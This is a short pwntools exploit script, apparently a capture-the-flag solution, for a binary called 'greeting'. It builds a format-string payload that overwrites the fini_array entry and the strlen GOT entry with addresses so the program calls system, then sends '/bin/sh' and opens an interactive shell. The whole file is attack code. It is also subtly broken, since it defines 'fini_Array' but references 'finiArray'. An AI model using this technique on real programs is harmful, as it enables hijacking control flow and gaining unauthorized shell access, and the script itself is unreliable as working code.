from pwn import *


p = process('greeting')
#gdb.attach(target, gdbscript = 'b *0x0804864f')

# overwritting
fini_Array = 0x08049934
strlenGot = 0x08049a54

#overwritting with
getline = 0x8048614
system_Plt = 0x8048490


payload = ""

#  padding
payload += "xx"
payload += p32(finiArray)
payload += p32(finiArray + 2)
payload += p32(strlenGot)
payload += p32(strlenGot + 2)
payload += "%34288x"
payload += "%12$n"
payload += "%65148x"
payload += "%14$n"
payload += "%33652x"
payload += "%13$n"
payload += "%15$n"


p.sendline(payload)
# system('/bin/sh') 
p.sendline('/bin/sh')
p.interactive()
